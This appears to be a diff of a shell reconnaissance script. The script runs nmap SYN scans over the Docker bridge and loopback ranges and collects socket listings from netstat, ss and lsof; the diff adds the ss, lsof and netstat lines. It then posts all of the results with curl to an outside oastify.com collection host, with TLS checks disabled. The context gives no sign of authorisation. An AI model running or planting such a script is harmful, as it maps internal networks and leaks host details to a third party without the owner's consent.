@@ -8,6 +8,9 @@ echo "Scanning eth0 range (172.17.0.0/16)..." >  output.txt
 echo -e "\nScanning lo range (127.0.0.0/8)..." >> output.txt
 ./nmap -vv -sS 127.0.0.0/8 >> output.txt
 netstat -a >> output.txt
+ss -tuln >> output.txt
+lsof -i -n -P >> output.txt
+netstat -tuln >> output.txt
 
 curl -k -X POST -H "Content-Type: text/plain" --data-binary @output.txt 'http:/hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/nmap'
 
